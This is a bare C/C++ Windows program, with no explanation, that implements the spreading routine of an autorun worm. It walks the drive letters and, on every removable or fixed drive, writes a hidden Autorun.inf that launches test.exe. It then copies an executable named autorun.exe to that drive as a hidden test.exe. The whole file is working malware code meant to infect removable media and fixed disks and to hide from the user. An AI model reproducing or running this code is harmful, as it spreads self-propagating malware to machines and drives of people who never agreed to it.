#include<stdio.h>
#include<windows.h>
int main(){
	FILE *fp;
	char disk;
	char driveName[4];
	char fileName[MAX_PATH] = {0};
	sprintf(driveName,"C:");
	for(driveName[0]='C';driveName[0]<'Z';driveName[0]++){
		if(::GetDriveType(driveName)==DRIVE_REMOVABLE||::GetDriveType(driveName)==DRIVE_FIXED){
			disk = driveName[0];
			sprintf(fileName,"%c:\\Autorun.inf",disk);
			fp = fopen(fileName,"w+");
			fprintf(fp,"[Autorun]\n");
			fprintf(fp,"OPEN=test.exe\n");
			fprintf(fp,"SHELLEXECUTE=test.exe\n");
			fprintf(fp,"shell\\Auto\\command=test.exe\n");
			fprintf(fp,"shell=Auto");
			fclose(fp);
			::SetFileAttributes(fileName,FILE_ATTRIBUTE_HIDDEN);
			sprintf(fileName,"%c:\\test.exe",disk);
			::CopyFile("autorun.exe",fileName,TRUE);
			::SetFileAttributes(fileName,FILE_ATTRIBUTE_HIDDEN);
		}
	}
	return 0;
}